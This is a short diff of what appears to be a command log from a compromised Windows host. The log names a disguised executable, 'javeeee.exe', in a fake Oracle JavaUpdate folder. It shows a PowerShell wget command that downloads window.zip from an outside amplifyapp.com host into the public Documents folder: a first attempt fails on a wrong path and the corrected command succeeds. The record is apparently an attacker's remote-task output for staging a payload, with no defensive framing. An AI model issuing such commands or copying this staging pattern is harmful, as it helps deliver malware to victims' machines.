@@ -1,4 +1,4 @@
-2026-08-28T12:45:38.7255451
+2026-08-28T12:48:28.476173
 
 DESKTOP-9ISASHE / user
 
@@ -8,12 +8,5 @@ C:\Users\afzan\AppData\Local\Oracle\JavaUpdate\javeeee.exe
 
 
 
-CMD[1/1] powershell wget https://staging.d1yxos5modoo20.amplifyapp.com/window.zip -o c:\user\public\documents\window.zip
-wget : Could not find a part of the path 'C:\user\public\documents\window.zip'.
-At line:1 char:1
-+ wget https://staging.d1yxos5modoo20.amplifyapp.com/window.zip -o c:\u ...
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], DirectoryNotFoundException
-    + FullyQualifiedErrorId : System.IO.DirectoryNotFoundException,Microsoft.PowerShell.Commands.InvokeWebRequestComma 
-   nd
- 
+CMD[1/1] powershell wget https://staging.d1yxos5modoo20.amplifyapp.com/window.zip -o c:\users\public\documents\window.zip
+(no output)
